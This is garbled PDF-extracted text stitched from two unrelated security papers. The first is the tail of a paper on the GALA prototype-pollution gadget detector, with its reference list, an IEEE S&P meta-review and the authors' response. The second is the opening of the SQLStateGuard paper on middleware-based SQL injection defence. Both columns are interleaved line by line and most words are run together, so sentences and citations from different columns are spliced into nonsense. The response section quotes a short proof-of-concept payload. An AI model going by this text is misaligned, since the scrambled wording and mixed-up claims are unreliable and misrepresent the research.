+[4] Z. Kang, S. Li, and Y. Cao, “Probe the proto: Measuring client- [23] Ecmascript®2025languagespecification.https://tc39.es/ecma262/.
+sideprototypepollutionvulnerabilitiesofonemillionreal-worldweb- [24] S. Lekies, B. Stock, and M. Johns, “25 million flows later: large-
+sites,”in2022NetworkandDistributedSystemsSecuritySymposium scaledetectionofdom-basedxss,”inProceedingsofthe2013ACM
+(NDSS),2022. SIGSACconferenceonComputer&communicationssecurity,2013,
+[5] Z. Liu, K. An, and Y. Cao, “Undefined-oriented programming: De- pp.1193–1204.
+tectingandchainingprototypepollutiongadgetsinnode.jstemplate [25] W. Melicher, A. Das, M. Sharif, L. Bauer, and L. Jia, “Riding
+engines for malicious consequences,” in 2024 IEEE Symposium on out domsday: Towards detecting and preventing dom cross-site
+SecurityandPrivacy,2024. scripting,” in Network and Distributed System Security Symposium,
+[6] M.Shcherbakov,M.Balliu,andC.-A.Staicu,“Silentspring:Proto- 2018. [Online]. Available: https://api.semanticscholar.org/CorpusID:
+type pollution leads to remote code execution in node.js,” in 32nd 3389782
+USENIXSecuritySymposium,2023. [26] M. Steffens, C. Rossow, M. Johns, and B. Stock, “Don’t Trust The
+Locals:InvestigatingthePrevalenceofPersistentClient-SideCross-
+[7] “Codeql,”https://codeql.github.com/,accessed:2022-12-14.
+SiteScriptingintheWild,”inNetworkandDistributedSystemSecu-
+[8] Y.Zheng,X.Zhang,andV.Ganesh,“Z3-str:Az3-basedstringsolver rity Symposium (NDSS), 2019, https://publications.cispa.saarland/id/
+forwebapplicationanalysis,”inInt.Symp.FoundationsofSoftware eprint/2744.
+Eng.(FSE),2013,2013.
+[27] A. S. Buyukkayhan, C. Gemicioglu, T. Lauinger, A. Oprea,
+[9] Google.TheChromiumProjects.http://www.chromium.org/Home. W. Robertson, and E. Kirda, “What’s in an exploit? an empirical
+analysis of reflected server XSS exploitation techniques,” in 23rd
+[10] Follow-my-Flow-GaLA, “Follow My Flow: Unveiling Client-Side
+International Symposium on Research in Attacks, Intrusions and
+Prototype Pollution Gadgets from One Million Real-World Web-
+Defenses (RAID 2020). San Sebastian: USENIX Association, Oct.
+sites,”https://github.com/Follow-my-Flow-GaLA/analysis,2024,ac-
+2020, pp. 107–120. [Online]. Available: https://www.usenix.org/
+cessed:2024-09-24.
+conference/raid2020/presentation/buyukkayhan
+[11] V.LePochat,T.VanGoethem,S.Tajalizadehkhoob,M.Korczynski,
+[28] MongoDB.Mongodb.https://www.mongodb.com.
+and W. Joosen, “Tranco: A research-oriented top sites ranking
+hardened against manipulation,” Proceedings of 2019 Network and [29] Usage statistics and market share of Vue.js Version 2 for websites.
+Distributed System Security Symposium, 2019. [Online]. Available: https://w3techs.com/technologies/details/js-vuejs/2.
+http://dx.doi.org/10.14722/ndss.2019.23386
+[30] S.Li,M.Kang,J.Hou,andY.Cao,“Miningnode.jsvulnerabilities
+[12] National Vulnerability Database, “CVE-2024-6783,” https://nvd.nist. via object dependence graph and query,” in 31st USENIX Security
+gov/vuln/detail/CVE-2024-6783,2024,accessed:2024-09-16. Symposium(USENIXSecurity22),2022,pp.143–160.
+
+[31] M. Shcherbakov, P. Moosbrugger, and M. Balliu, “Unveiling the [47] I. Parameshwaran, E. Budianto, S. Shinde, H. Dang, A. Sadhu,
+invisible: Detection and evaluation of prototype pollution gadgets and P. Saxena, “Auto-patching dom-based xss at scale,” in
+withdynamictaintanalysis,”arXivpreprintarXiv:2311.03919,2023, Proceedings of the 2015 10th Joint Meeting on Foundations of
+https://arxiv.org/pdf/2311.03919.pdf. SoftwareEngineering,ser.ESEC/FSE2015. NewYork,NY,USA:
+Association for Computing Machinery, 2015, p. 272–283. [Online].
+[32] K.Sen,S.Kalasapur,T.Brutch,andS.Gibbs,“Jalangi:Aselective
+Available:https://doi.org/10.1145/2786805.2786821
+record-replay and dynamic analysis framework for javascript,” in
+Proceedingsofthe20139thJointMeetingonFoundationsofSoftware [48] DOMinator.https://github.com/wisec/DOMinator.
+Engineering,2013,pp.488–498.
+[49] S.KhodayariandG.Pellegrino,“It’s(dom)clobberingtime:Attack
+[33] L.Gong,M.Pradel,andK.Sen,“Jitprof:Pinpointingjit-unfriendly techniques, prevalence, and defenses,” in 2023 IEEE Symposium on
+javascript code,” in Proceedings of the 2015 10th joint meeting on SecurityandPrivacy,2023.
+foundationsofsoftwareengineering,2015,pp.357–368. [50] D. Klein, T. Barber, S. Bensalim, B. Stock, and M. Johns, “Hand
+[34] F. Xiao, J. Huang, Y. Xiong, G. Yang, H. Hu, G. Gu, and W. Lee, sanitizersinthewild:Alarge-scalestudyofcustomjavascriptsani-
+“Abusinghiddenpropertiestoattackthenode.jsecosystem,”in30th tizerfunctions,”in2022IEEE7thEuropeanSymposiumonSecurity
+USENIXSecuritySymposium(USENIXSecurity21),2021,pp.2951– andPrivacy(EuroS&P),2022.
+2968. [51] D.KleinandM.Johns,“Parseme,baby,onemoretime:Bypassing
+htmlsanitizerviaparsingdifferentials,”in2024IEEESymposiumon
+[35] Y. Liu, J. Xie, J. Yang, S. Guo, Y. Deng, S. Li, Y. Wu, and
+SecurityandPrivacy,2024.
+Y. Liu, “Industry practice of javascript dynamic analysis on wechat
+mini-programs,”inProceedingsofthe35thIEEE/ACMInternational [52] B. Stock, S. Lekies, T. Mueller, P. Spiegel, and M. Johns, “Precise
+Conference on Automated Software Engineering, 2020, pp. 1189– Client-side Protection against DOM-based Cross-Site Scripting,” in
+1193. Proceedingsofthe2014USENIXSecuritySymposium,2014.
+[36] Jalangi2 Tutorial Sildes: A Dynamic Analysis Framework for [53] M. Smith, A. Torres-Agu¨ero, R. Grossman, P. Sen, Y. Chen, and
+JavaScript.https://manu.sridharan.net/files/JalangiTutorial.pdf. C.Borcea,“Astudyofgdprcomplianceunderthetransparencyand
+consentframework,”inWWW’24:ProceedingsoftheACMonWeb
+[37] N. Jovanovic, C. Kruegel, and E. Kirda, “Pixy: A static analysis
+Conference2024,2024.
+tool for detecting web application vulnerabilities,” in 2006 IEEE
+Symposium on Security and Privacy (S&P’06). IEEE, 2006, pp. [54] A.Rasaii,D.Gosain,andO.Gasser,“Thoushaltnotreject:Analyzing
+6–pp. accept-or-paycookiebannersontheweb,”inIMC’23:Proceedings
+ofthe2023ACMonInternetMeasurementConference,2023.
+[38] S. H. Jensen, A. Møller, and P. Thiemann, “Type analysis for
+javascript,” in Static Analysis: 16th International Symposium, SAS
+2009, Los Angeles, CA, USA, August 9-11, 2009. Proceedings 16.
+Springer,2009,pp.238–255.
+[39] M.Madsen,B.Livshits,andM.Fanning,“Practicalstaticanalysisof
+javascriptapplicationsinthepresenceofframeworksandlibraries,”in
+Proceedingsofthe20139thJointMeetingonFoundationsofSoftware
+Engineering,2013,pp.499–509.
+[40] V.Kashyap,K.Dewey,E.A.Kuefner,J.Wagner,K.Gibbons,J.Sar-
+racino, B. Wiedermann, and B. Hardekopf, “Jsai: A static analysis
+platformforjavascript,”inProceedingsofthe22ndACMSIGSOFT
+international symposium on Foundations of Software Engineering,
+2014,pp.121–132.
+[41] M. Madsen, F. Tip, and O. Lhota´k, “Static analysis of event-driven
+node. js javascript applications,” ACM SIGPLAN Notices, vol. 50,
+no.10,pp.505–519,2015.
+[42] B. B. Nielsen, B. Hassanshahi, and F. Gauthier, “Nodest: feedback-
+drivenstaticanalysisofnode.jsapplications,”inProceedingsofthe
+2019 27th ACM Joint Meeting on European Software Engineering
+Conference and Symposium on the Foundations of Software Engi-
+neering,2019,pp.455–465.
+[43] A. Fass, M. Backes, and B. Stock, “Jstap: A static pre-filter for
+malicious javascript detection,” in Proceedings of the 35th Annual
+ComputerSecurityApplicationsConference,2019,pp.257–269.
+[44] S. Khodayari and G. Pellegrino, “{JAW}: Studying client-side
+{CSRF} with hybrid property graphs and declarative traversals,” in
+30thUSENIXSecuritySymposium(USENIXSecurity21),2021,pp.
+2525–2542.
+[45] M. Kang, Y. Xu, S. Li, R. Gjomemo, J. Hou, V. Venkatakrishnan,
+and Y. Cao, “Scaling javascript abstract interpretation to detect and
+exploit node. js taint-style vulnerability,” in 2023 IEEE Symposium
+on Security and Privacy (SP). IEEE Computer Society, 2023, pp.
+1059–1076.
+[46] X. Zhang, X. Wang, R. Slavin, and J. Niu, “Condysta: Context-
+aware dynamic supplement to static taint analysis,” in 2021 IEEE
+Symposium on Security and Privacy (SP). IEEE, 2021, pp. 796–
+812.
+
+Appendix A. 3) The BlackFan dataset used for false negative eval-
+Meta-Review uation in RQ3 is rather small and may not fully
+represent thevarietyofprototypepollutiongadgets
+Thefollowingmeta-reviewwaspreparedbytheprogram that exist in the broader population of web appli-
+committee for the 2025 IEEE Symposium on Security and cations. In addition, it contains many similar pay-
+Privacy (S&P) as part of the review process as detailed in loads, potentially introducing bias toward specific
+the call for papers. pollution types and unfairness toward other tools
+considered as baseline.
+4) The exploration of prototype pollution conse-
+A.1. Summary
+quences is not systematic; the paper considers spe-
+cific issues such as XSS and URL/cookie manipu-
+This paper proposes GALA, a dynamic analysis ap-
+lations but overlooks others like client-side request
+proach to detect prototype pollution data flows from un-
+forgery and privilege escalation.
+defined variables to sensitive sinks, by borrowing defined
+5) The paper assumes that the target website has a
+values from other webpages. The authors evaluated GALA
+pre-existing prototype pollution vulnerability (i.e.,
+ontop1Mwebsites,findingseveralnewprototypepollution
+an injection point), which allows an attacker to
+gadgets.
+manipulate object properties. Without this known
+vulnerability,thegadgetsdetectedbyGALAwould
+A.2. Scientific Contributions
+notbeexploitable,asGALAonlyidentifiesgadgets
+rather than the vulnerabilities themselves.
+• Creates a New Tool to Enable Future Science
+• Provides a Valuable Step Forward in an Established
+Appendix B.
+Field
+Response to the Meta-Review
+• Identifies an Impactful Vulnerability
+A.3. Reasons for Acceptance Wethankanonymousreviewersfortheirinsightfulcom-
+ments and the shepherd for the meta-review! We acknowl-
+edgethefivenoteworthyconcernsraisedinthemeta-review
+1) The paper proposes a novel approach to proto-
+and leave them for future works; meanwhile, we provide
+type pollution gadget detection, called GALA, that
+additional responses to the concerns.
+borrows defined values from existing webpages
+to guide dynamic analysis in locating data flow 1) We report a total of 471,788 websites where un-
+gadgetsfromundefinedvariablestosensitivesinks. defined value replacement was possible during the
+GALA will be made publicly available to enable evaluation of GALA on top one million Tranco
+future research. websites. Then, to evaluate impacts of GALA’s
+2) The paper provides a baseline comparison of value replacement on code coverage, we tested
+GALA with Silent Spring and ProbeTheProto for GALA on 25 randomly-selected Tranco domains.
+gadget detection, showing a modest improvement We utilized Chrome DevTools to measure the lines
+in reducing false positives and false negatives. of code (LoC) that were executed as the metric for
+3) Theanalysisofthetop1Mwebsitesprovidesuseful code coverage. By comparing the code coverage
+insights into prototype pollution gadgets, uncover- withandwithout GALA deployed,weobserved19
+ing numerous unknown vulnerabilities in the wild out of 25 domains have a code coverage increase.
+that affect, among others, Meta’s software and Vue 2) We leave the incorporation of mutation techniques,
+framework, demonstrating GALA’s real-world ap- such as directed fuzzing and adding test cases, for
+plicability. futurework.Wefurthernotethatthefalsenegatives
+(FNs) of GALA as reported in Table 4 are essen-
+A.4. Noteworthy Concerns tiallycomplexandchallengingtodetectandexploit
+evenwiththemutationtechniques.Forexample,the
+1) The evaluation lacks statisticical details on the reason for one FN is the involvement of multiple
+number of domains where undefined value re- properties and a complex Array structure, which
+placement was possible as well as cases where cannot be resolved by mutation techniques.
+it was successful, i.e., broader code coverage was 3) WediscussthreethingsabouttheBlackFandataset:
+achieved because of this approach. (i) despite its size, it is the only publicly available
+2) GALA only relies on values collected during the dataset for client-side prototype pollution gadgets
+crawling phase and does not mutate these values and that is the best we can do; (ii) the gad-
+to explore different code execution paths, missing gets are representative because BlackFan’s authors
+more complex gadgets that require specific values curated the dataset using gadgets from various
+assignedtoundefinedpropertiestobereached(e.g., real-world applications; (iii) exploiting a gadget
+23% false negative rate in Table 4). (e.g., __proto__[prop]=alert(1)) requires
+
+not only payloads (alert(1)) but also property
+names (prop), and 37 out of 39 (94.87%) of the
+property names in the BlackFan gadgets’ proofs of
+concept (PoCs) are distinct. Therefore, the exploits
+for the gadgets in the dataset are diversified.
+4) The taint engine that GALA utilizes is adopted
+fromtheoneusedinpriorwork[4],whichonlyex-
+ploresXSSandcookie/URLmanipulationsasthree
+in-scopeconsequences.Weleavetheexplorationof
+other consequences such as CSRF for future work.
+5) We would like to emphasize that the detection
+of gadget alone is an important research ques-
+tion across different fields. Two prior works on
+server-side gadget detection [5], [6] also assume
+the existence of prototype pollution vulnerabilities.
+Similarly,researchesonthedetectionofgadgetsfor
+memory-related vulnerabilities [18]–[21] assume
+the presence of memory-safety vulnerabilities such
+as buffer overflows. More details can be found in
+section 2.3.=====================
+
+=====================
+
+SQLStateGuard: Statement-Level SQL Injection
+Defense Based on Learning-Driven Middleware
+Xin Liu Yuanyuan Huang∗ Song Li†
+SchoolofInformationScience& Tianyi Wang∗ TheStateKeyLaboratoryof
+Engineering,LanzhouUniversity BlockchainandDataSecurity,
+huangyy19@lzu.edu.cn
+Lanzhou,Gansu,China ZhejiangUniversity
+wangty2020@lzu.edu.cn
+bird@lzu.edu.cn Hangzhou,Zhejiang,China
+SchoolofInformationScience&
+songl@zju.edu.cn
+Engineering,LanzhouUniversity
+Lanzhou,Gansu,China
+Weina Niu Jun Shen Qingguo Zhou†
+SchoolofComputerScienceand SchoolofComputingand SchoolofInformationScience&
+Engineering,Universityof InformationTechnology, Engineering,LanzhouUniversity
+ElectronicScienceandTechnology UniversityofWollongong Lanzhou,Gansu,China
+ofChina Wollongong,NewSouthWales zhouqg@lzu.edu.cn
+Chengdu,Sichuan,China Australia
+vinusniu@uestc.edu.cn jshen@uow.edu.au
+Xiaokang Zhou
+FacultyofBusinessDataScience,
+KansaiUniversity
+Suita,Osaka,Japan
+zhou@kansai-u.ac.jp
+ABSTRACT database-orienteddetectionnetworkbasedongatedlinear
+SQLinjectionisasignificantandpersistentthreattoweb units.IfSQLSG-NetdetectsmaliciousSQLstatements,the
+services.MostexistingprotectionsagainstSQLinjections SQLmiddlewarewillblockthem.Experimentsshowthatthe
+relyontraffic-levelanomalydetection,whichoftenresults detectionaccuracyofSQLStateGuardexceeds99%,outper-
+inhighfalse-positiveratesandcanbeeasilybypassedby formingexistingapproaches,anditcanidentifythetypeof
+attackers.ThispaperintroducesSQLStateGuard,theworld’s aspecificSQLinjection.Additionally,SQLStateGuardhasno
+first middleware-driven statement-level SQL injection de- fingerprintanddoesnotrespondtoSQLsyntaxerrors,mak-
+fenseapproach,toaddresstheseissues.TheSQLStateGuard ingitmorechallengingforattackerstogatherinformation.
+uses a custom SQL middleware based on the idea of Run- Thispaperalsopresentsanoveldatasetgenerationprocess
+timeApplicationSelf-ProtectiontocapturerawSQLstate- forSQLStateGuardandsharestwostatement-levelSQLin-
+ments.ThesestatementsarethenanalyzedbySQLSG-Net,a jectiondatasetswiththeresearchcommunity,includingover
+145,000maliciousSQLstatementscategorizedbythetypeof
+∗Bothauthorscontributedequallytothisresearch. SQLinjection.
+†Correspondingauthors.
+Permissiontomakedigitalorhardcopiesofpartorallofthisworkfor CCSCONCEPTS
+personalorclassroomuseisgrantedwithoutfeeprovidedthatcopiesare
+• Security and privacy → Firewalls; Database activity
+notmadeordistributedforprofitorcommercialadvantageandthatcopies
+bearthisnoticeandthefullcitationonthefirstpage.Copyrightsforthird- monitoring.
+partycomponentsofthisworkmustbehonored.Forallotheruses,contact
+theowner/author(s).
+SoCC’24,November20–22,2024,Redmond,WA,USA KEYWORDS
+©2024Copyrightheldbytheowner/author(s).
+SQLInjection,AttackDetection,DeepLearning,WebSecu-
+ACMISBN979-8-4007-1286-9/24/11.
+https://doi.org/10.1145/3698038.3698569 rity,DataSecurity
+
+SoCC’24,November20–22,2024,Redmond,WA,USA Liuetal.
+ACMReferenceFormat: • ThispaperintroducestheideaofRASPintothemid-
+XinLiu,YuanyuanHuang,TianyiWang,SongLi,WeinaNiu,Jun dleware,therebyenablingsecurityanalysisandblock-
+Shen,QingguoZhou,andXiaokangZhou.2024.SQLStateGuard: ing SQL injection at the statement level. Compared
+Statement-LevelSQLInjectionDefenseBasedonLearning-Driven toexistingapproaches,SQLStateGuardcapturesthe
+Middleware.InACMSymposiumonCloudComputing(SoCC’24),
+statementsabouttobeexecuted,removingmostofthe
+November20–22,2024,Redmond,WA,USA.ACM,NewYork,NY,
+unnecessaryinformation,resultinginnon-intrusive
+USA,14pages.https://doi.org/10.1145/3698038.3698569
+andaccurateblockingofpotentiallyharmfulSQLin-
+jections.
+• A new SQL statement-level injection detection net-
+work, SQLSG-Net, is proposed to incorporate NLP
+1 INTRODUCTION
+techniques.SQLSG-NetconductsSQLsemanticpars-
+SQL injection is a technique attackers use to inject mali- ingandthenutilizesdatabase-orientedmodelsbased
+ciouspayloadsintoSQLstatementsexecutedbyadatabase on gated linear units mechanism to perform high-
+server.Attackerscanuseittostealconfidentialinformation precisionstatement-leveldifferenceminingbetween
+orcompromisetheintegrityofthedatabase[45].According SQL statements. This results in more accurate and
+toarecentresearch[4],despitebeingwell-knownforover faster detection, effectively reducing the number of
+twodecades,SQLinjectionremainsamongthetopattack falsepositivereportsgeneratedbymeaninglessSQL
+techniquesduetotheirlowcost,highimpact,andflexibility. injectionvectors.
+TraditionalSQLinjectiondetectionapproaches[6,7,29, • AprototypeofSQLStateGuardhasbeenimplemented
+40]generallydetectandfilterSQLinjectionsthroughrule andexperimentallyvalidatedusingdatasetsgenerated
+matching.Theeffectivenessoftheseapproacheshighlyde- throughanoveldatasetgenerationprocess.Theresults
+pendsonthedesignofpredefinedrules.Ifauser’srequest demonstratethatSQLStateGuardofferssignificantad-
+matchesarule,itwillbereportedasmalicious.Therefore, vantagesoverexistingapproaches.Withabinaryclas-
+theserulesareveryfragileinthefaceofnewthreats.Besides, sificationaccuracyofover99.9%,SQLStateGuardef-
+theyalsosufferfromsensitivitychallenges-laxmatching fectivelydetectsSQLinjectionswithameagerfalse
+rulescansignificantlyincreasefalsepositives.Incontrast, positiverateandcanaccuratelyidentifythedifferent
+stringentmatchingrulescansubstantiallyleadtolowerde- typesofSQLinjections.
+tectionrates. • Thispapersharestwostatement-levelSQLinjection
+Withadvancementsinmachinelearning,researchers[18, datasets 1 with the research community, including
+24,39]startedtouselearning-basedapproachestodetect morethan145,000maliciousSQLstatementscatego-
+SQLinjections.Mostofthemhavefocusedondetectionat rizedbythetypeofSQLinjection.
+thetrafficlevel.However,thecomplexityanddiversityof
+Therestofthispaperisorganizedasfollows:Section2
+trafficcanposechallengesformachinelearningmodelsto
+presentstheexistingapproachesofSQLinjectionprotection.
+detectSQLinjectionsaccurately.[12]Thedifferencebetween
+Section3presentsthedesignofSQLStateGuard.Section4
+normaltrafficandmalicioustrafficcanbeveryslight.On
+usesmultipledatasetstoevaluateSQLStateGuard.Section5
+theotherhand,mostfuzzingpayloadsdonotcauseareal
+discussestheweaknessesandfutureimprovementsofSQL-
+hazard,whiletraffic-leveldetectionwillgeneratenumerous
+StateGuard.Section6concludesthispaper.
+meaninglessalertsbecauseofthem,severelyincreasingthe
+burdenonsecurityengineers. 2 RELATEDWORK
+Inthispaper,wepresentSQLStateGuard,adeeplearning-
+ExistingSQLinjectionprotectionapproachesmainlyrely
+basedsolutiontodefendagainstSQLinjections.SQLState-
+onrules.[3]Dependingontheobjectofanalysis,existing
+Guard is based on middleware and operates at the state-
+approachescanbeclassifiedintocode-levelprotectionand
+mentlevel,enhancingdetectionaccuracyandreducingfalse
+traffic-levelprotection.
+alarms. It consists of two core components: the SQL mid-
+dlewareandSQLSG-Net.TheSQLmiddleware,builtonthe
+2.1 TraditionalSQLInjectionProtection
+RuntimeApplicationSelf-Protection(RASP)[2]idea,isre-
+sponsibleforextractingSQLstatementsanddetectingand Intermsofcode-levelprotection,existingresearchisusu-
+blockingSQLinjections.SQLSG-Net,ontheotherhand,is ally based on static approaches such as taint propagation
+a statement-level SQL injection detection network based analysis[36]tofindSQLinjectionvulnerabilitiesatthecode
+on Natural Language Processing (NLP). It uses database- level,addressingtherootcauseofSQLinjectionproblems.
+orientedmodelstodetectSQLinjectionsandidentifytheir
+typesaccurately.Wesummarizeourcontributionsasfollows. 1https://github.com/dstsmallbird/SQLStateGuard_Dataset
+
+SQLStateGuard:Statement-LevelSQLInjectionDefenseBasedonLearning-DrivenMiddleware SoCC’24,November20–22,2024,Redmond,WA,USA
+HTTP/HTTPS SQL SQL
+Filter
+Requests Statement Statement
+User WAF Server-end SQLStateGuard Database
+Service Service
+SQL SQL
+Statement Statement
+Service Client
+Interface Interface
+Results Results
+Processing Module
+Middleware
+Server-end Database
+Service SQL Statement Detection Result Service
+Albert
+Structural Feature Semantic Feature SQL Injection
+Extraction Layer Extraction Layer Detection Layer
+SQLSG-Net
+Figure1:WorkflowandArchitectureofSQLStateGuard
+RIPS[11],astaticcodeanalysistooldevelopedforPHPappli- SQLinjectionattacksbyexploitingtheinformationgapbe-
+cations,isoneofthemostrepresentativeapproachesofthis tweenattackanddefense,e.g.,SQLrand[7]usesinserting
+kind.Similarly,Meietal.[19]proposedagrey-boxapproach random numbers into SQL keywords and modifying SQL
+todetectSQLinjectionsinJavaruntime.Zhangetal.[46] interpreterstocounterinjections.
+tried to use Moving Target Defense (MTD) to reduce the
+attacksurfaceofSQLinjections. 2.2 Learning-basedSQLProtection
+Mosttraffic-levelprotectionisbasedonsyntaxanalysis Detection
+ofuserrequests[30],anditisveryraretoconductdetection
+Incode-levelprotection,researchershavetriedtoletAIun-
+basedentirelyonstatisticalcharacteristicsofnetworktraf-
+derstandthecodeandfindpotentialsecurityrisks,e.g.,Vul-
+fic,suchasrequestfrequency,requestpacketsize,andthe
+Hunter[14]basedondeeplearningandbytecodetodetect
+numberofconnections.Theonlyexistingworkistheap-
+SQL injection vulnerabilities in PHP applications. Traffic-
+proachproposedbyYufeietal.[47]fordetectingautomated
+levelprotectioniscurrentlythemostpopularresearchtopic
+SQLinjectiontests.Mostoftheapproachesbasedonsyntac-
+inlearning-basedSQLinjectionprotection.Similartotradi-
+ticanalysisofuserrequestsareIntrusionDetectionSystem
+tionalapproaches,althoughthereareapproaches[44]based
+(IDS)-relatedstudies,whichdirectlydetectthecontentof
+entirelyonstatisticalfeaturesoftraffic,userrequestsanaly-
+userrequests(e.g.,HTTPmessages)basedonthecompleted
+sisbasedonpacketinspectionandprotocolanalysisusing
+protocol parsing, and WAF is the representative. [8] Tra-
+deeplearningtechniquesisstillpredominant.Liuetal.[25]
+ditionalIDScanalsodetectSQLinjectionattacks,suchas
+proposedOwlEye,ahybridattackdetectionsensorbasedon
+Zolotukhinetal.[48],whomodelnormaluserbehaviorus-
+HiddenMarkovModel(HMM)designedtodefendagainst
+inganomalydetectionalgorithmsandclusteringalgorithms
+web-layercodeinjectionattacks,achievingahighdetection
+andthenidentifymaliciousrequestsbythedeviationvalues
+ratewithanacceptablefalsepositiveratethroughitsbidi-
+ofuserbehavior.Therearealsosomeideastoprotectagainst
+rectional scoring architecture that leverages both benign
+andmalicioustrafficinmodeltraining.Pengetal.[35]use
+
+SoCC’24,November20–22,2024,Redmond,WA,USA Liuetal.
+MultilayerPerceptron(MLP)andLongShort-TermMemory programandthedatabaseservice,andallSQLstatements
+(LSTM)todetectSQLinjectionsbasedonpacketinspection. are passed throughit forsecuritychecks. SQLStateGuard
+Liuetal.[41]proposedtheMulti-classS-TCNmodel,which hastwoworkingmodes:BlockingModeandBypassMode.
+enhancesthedetectionspeedandaccuracyofSQLinjection InBlockingMode,SQLStateGuardwillcheckthesecurityof
+attacksbyleveragingtimeconvolutionalnetworks,signifi- SQLstatementsbeforedecidingwhethertoforwardthem
+cantlyimprovingreal-timetrafficanalysisinIoTscenarios. todatabaseservices,whichmeansthismodecanblockSQL
+Crespo-Martínezetal.[10]useaLogisticRegression-based injectionsinreal-time.BypassModeissuitableforservices
+modeltodetectSQLinjections.Abaimmovetal.[1]proposed with high-frequency requests but low data sensitivity. In
+CODDLEsystem,whichusesConvolutionalNeuralNetwork BypassMode,SQLStateGuardwillforwardSQLstatements
+(CNN)todetectinjections.Luetal.[27]constructamodel tothedatabaseserviceandmakesecuritycheckssimultane-
+namedsynBERTtodectectSQLinjections.Inrecentyears, ously,andthetwoprocessesareindependentofeachother.
+therehavebeensomeresearchersinstatementleveldetec- SQLStateGuardinBypassModewillalertsecurityoperators
+tion,butmostoftheirdetectionrulesarerelativelysimple. whenitfindsamaliciousSQLstatementratherthanblocking
+William G. J. et al. [15] combined static analysis with dy- SQLinjectionsinreal-time.
+namicmonitoringtodevelopatoolnamedAMNESIA.This Thearchitectureofthedetectionsystemisshownbelow
+tool constructsSQL query models throughstatic analysis thedottedlineinFigure1,andconsistsoftwosignificant
+andsubsequentlymonitorsqueriesatruntimetodetectpo- components:SQLMiddlewareandSQLSG-Net.SQLmiddle-
+tentialSQLinjectionattacks.Konstantinosetal.[20]detect wareismainlyusedtointercepttheSQLstatementsbetween
+SQLinjectionattacksbyinterceptingSQLstatementsand theback-endapplicationandthedatabaseandblockthema-
+determiningwhetherthestatementsconformtopredefined liciousones,anditsmodeofoperationissimilartothatofa
+specifications. proxyserver.SQLSG-Netisastatement-levelSQLinjection
+OneofthemostimportantfeaturesofSQLinjectionsis detectionnetworkbasedongatedlinearunits[17],andits
+theuseofspecialsymbolstobreakthroughtheoriginalstate- maintaskistoperformsecurityanalysisofSQLstatements.
+mentstructure,whichhasbeendiscussedindepthbyexist-
+ingapproaches[26,42,43].However,sinceuser-generated
+3.2 SQLMiddleware
+contentishighlyvariable,itisdifficultfordatasetstocover
+allnormaluserinput,makingnormaluserrequests(espe- SQLMiddlewareisthekeycomponentusedtoextractSQL
+ciallythoseincludingspecialsymbolssuchassinglequotes) statementsandcompleteSQLinjectiondetectionandblock-
+easilymistakenformaliciousrequests.Sincethelearning- ing,andithasthreemodules:serviceinterface,clientinter-
+based approaches rely on generalization, it is difficult to face,andprocessingmodule.Theserviceinterfaceisused
+adjusttherulesastraditionalapproachesdowhensuchprob- toestablishconnectionswiththeback-endprogram.Forthe
+lemsarise,whichreducesthefeasibilityofthelearning-based back-endprogram,theserviceinterfacebehavesastheinter-
+approachintherealworld. faceofthedatabase;theclientinterfaceisusedtoestablish
+connectionswiththedatabase.Forthedatabase,theclient
+3 DESIGNOFSQLSTATEGUARD interfacebehavesastheinterfaceoftheback-endprogram.
+The processing module is used to complete the logic and
+3.1 Overview
+dataforwardingoftheSQLmiddleware.
+SQLinjectiondetectionisastrong-demandoldtopicwithout WhenSQLStateGuardinBypassModereceivestheSQL
+SilverBullets.SuccessfulSQLinjectionsarenotspecificatthe statementrequestfromtheback-endprogram,theprocess-
+statementlevel,soevenexperiencedsecurityexpertscannot ingmodulewillprovidetheSQLstatementfromtheservice
+tellifastatementisanSQLinjectionwithoutunderstanding interfacetothedetectionnetworkSQLSG-Netforsecurity
+thecodeimplementation,whichisthebiggestchallengein analysiswhileusingtheclientinterfacetoforwardtheSQL
+statement-level defense. We choose to sacrifice flexibility statementtothedatabaseandsendthereturnofthedatabase
+foraccuracy.SQLStateGuardsupportseverySQLvariantor backtotheback-endprogramthroughtheserviceinterface.
+dialect,buteachdatabaseinthedatabaseserverthatneeds Then,accordingtotheresultsoftheanalysisofSQLSG-Net,
+tobeprotectedneedsitsowndatasetandacorresponding itwilldecidewhethertosendalarmmessagestosecurity
+detectionmodeltrainedforit. personnel.WhenSQLStateGuardinBlockingModereceives
+ThepartabovethedottedlineinFigure1showsanap- anSQLstatementfromtheback-endprogram,theprocess-
+plicationscenariowheretheusersendsarequesttotheap- ingmodulewillprovidetheSQLstatementfromtheservice
+plicationinterface,andthentheback-endprogramdoesthe interfacetoSQLSG-Netforsecurityanalysis.IfSQLSG-Net
+actualprocessingandinteractswiththedatabase.Asseen labels the SQL statement as normal, the processing mod-
+fromthefigure,SQLStateGuardworksbetweentheback-end ule forwards this statement to the database and provides
+
+SQLStateGuard:Statement-LevelSQLInjectionDefenseBasedonLearning-DrivenMiddleware SoCC’24,November20–22,2024,Redmond,WA,USA
+theresultreturnedbythedatabaseservicetotheback-end toit.BytraversingtheAST,thislayerextractstheSQLstate-
+program. mentcomponents,suchastablenamesandcolumnnames,
+Intherealworld,attackersusuallyperformfuzzytests thatareirrelevanttoSQLinjectionsandgeneralizesthem
+againstWAFsandotherprotectionsystemstodiscoverflaws tofixedvalues.Specifically,thegeneralizationtargetsand
+intheirrulesbeforeperforminganeffectiveSQLinjection, resultsareshowninTable1.Thislayerdoesnotgeneralize
+mainlybyinsertingspecialcharacters.SQLMiddlewareonly SQLkeywordssuchasSELECT,INSERT,BEGIN,SUM,and
+blocksSQLstatementsthatarelabeledmaliciousbySQLSG- SQLbuilt-infunctions.Unlikeotherstrings,thesekeywords
+Net.Iftheattacker’stestvectorsdonotconstituteSQLin- areessentialcomponentsofstatementstructureanddirectly
+jections,SQLMiddlewarewillnotblockthem,allowingthe reflectthefunctionofthestatement.Throughthislayer,the
+attackertoobtainnormalreturns.Itmakesitmuchmore changescausedbyuser-sideinputintheSQLstatementare
+difficultfortheattackertofindthevulnerabilityintheinter- eliminatedconsiderably,whilethestructuralfeaturesofthe
+ceptionrulesthroughfuzzytestsasinthecaseoftraditional SQLstatementarepreserved.
+WAFs,thusincreasingtheattacker’sattackcost. Asmentionedearlier,anattackerusuallyperformsaseries
+offuzztestsbeforeperforminganeffectiveSQLinjection.
+3.3 SQLSG-Net Inadditiontodetectingflawsintheprotectionsystem,the
+ThestructureofSQLSG-NetisshowninFigure2.SQLSG- attackermayusethesefuzzteststocausesyntacticerrors
+Netextractsboththesyntacticstructureinformationfrom intheSQLstatementssplicedbytheback-endprogramto
+SQLkeywordsandthesemanticinformationfromthewhole determinethespecificinjectiontechniques.Sincethislayer
